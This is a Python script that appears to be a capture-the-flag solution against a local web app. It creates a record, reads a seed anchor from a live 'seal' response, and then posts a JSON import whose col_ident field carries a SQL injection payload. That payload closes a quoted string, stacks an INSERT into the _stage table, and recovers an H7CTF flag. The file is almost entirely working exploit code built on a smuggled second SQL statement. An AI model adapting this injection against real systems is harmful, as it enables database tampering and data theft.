#!/usr/bin/env python3
import json
import re
import sys
import urllib.request
import urllib.parse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8090"


def post_form(path, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    return urllib.request.urlopen(req)


def post_json(path, obj):
    body = json.dumps(obj).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST",
                                 headers={"Content-Type": "application/json"})
    return urllib.request.urlopen(req).read().decode()


def get(path):
    return urllib.request.urlopen(BASE + path).read().decode()


def note_of(html):
    m = re.search(r'<div class="note">(.*?)</div>', html, re.S)
    return m.group(1).strip() if m else ""


def create_base(name):
    r = post_form("/bases", {"name": name})
    return r.url.rstrip("/").split("/")[-1]


def add_field(bid, label):
    post_form(f"/bases/{bid}/fields", {"label": label})


def seal(bid):
    return post_form(f"/bases/{bid}/seal", {}).read().decode()


def main():
    bid = create_base("Ledger")
    add_field(bid, "Amount")

    recon = seal(bid)
    anchor_m = re.search(r"anchor_[0-9a-f]+", note_of(recon))
    if not anchor_m:
        print("could not observe the seed anchor from a live seal", file=sys.stderr)
        sys.exit(1)
    anchor = anchor_m.group(0)
    print(f"[+] observed live seed anchor: {anchor}")

    payload = (
        "', md5(frag) FROM _stage WHERE field='" + anchor + "'; "
        "INSERT INTO _stage(field,frag) SELECT frag, 'x' FROM _stage WHERE field='" + anchor + "'; -- "
    )
    print(f"[+] poisoned col_ident: {payload}")

    res = post_json(f"/api/bases/{bid}/import",
                    {"fields": [{"label": "region", "col_ident": payload, "position": 5}]})
    print(f"[+] import result: {res.strip()}")

    sealed = seal(bid)
    note = note_of(sealed)
    print(f"[+] rollup note after exploit seal: {note}")

    flag_m = re.search(r"H7CTF\{[^}]*\}", note)
    if not flag_m:
        print("no flag recovered", file=sys.stderr)
        sys.exit(1)
    print("FLAG " + flag_m.group(0))


if __name__ == "__main__":
    main()
